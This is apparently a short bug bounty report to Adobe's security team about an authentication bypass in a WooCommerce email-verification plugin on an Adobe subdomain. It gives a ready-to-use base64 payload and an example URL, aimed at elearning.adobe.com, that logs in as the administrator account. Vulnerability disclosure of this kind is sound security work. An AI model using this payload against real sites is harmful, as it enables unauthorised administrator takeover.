## Summary:
Hello, Security team today when I try to discover some vulnerability on Adobe subdomains I found subdomain work on WordPress and this sub hash plugin is vulnerable to Improper Authentication vulnerability.

## Platform(s) Affected:
WordPress Plugin WooCommerce < 1.8.2 

## Steps To Reproduce:

An attacker can manipulate $_GET['alg_wc_ev_verify_email'] and set this payload: eyJpZCI6MSwiY29kZSI6MH0=

Example: https://elearning.adobe.com/?alg_wc_ev_verify_email=eyJpZCI6MSwiY29kZSI6MH0%3D

after decoding payload: {"id":1,"code":0} (1 being the user_id of an administrator account)

The alg_wc_ev_redirect_to_my_account_on_success option of the plugin must be set to 'yes' (which is the default) 



## Supporting Material/References:
https://wpscan.com/vulnerability/10318
https://plugins.trac.wordpress.org/changeset/2312715
https://vulners.com/wpexploit/WPEX-ID:10318
